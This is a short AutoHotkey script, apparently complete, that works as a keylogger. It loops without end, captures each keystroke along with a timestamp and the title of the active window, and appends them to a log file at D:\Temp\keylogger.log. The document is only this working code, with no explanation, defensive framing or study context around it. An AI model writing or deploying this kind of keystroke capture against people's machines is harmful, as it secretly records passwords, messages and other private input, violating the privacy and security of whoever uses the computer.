#SingleInstance,Force
SetBatchLines, -1
Loop{
	Input, key, V B M T5
	FormatTime, time ,, MM-dd-yyyy hh:mm:ss
	WinGetActiveTitle , win
	FileAppend, %time%`n, D:\Temp\keylogger.log
	FileAppend, %win%`n, D:\Temp\keylogger.log
	FileAppend, %key%`n, D:\Temp\keylogger.log
}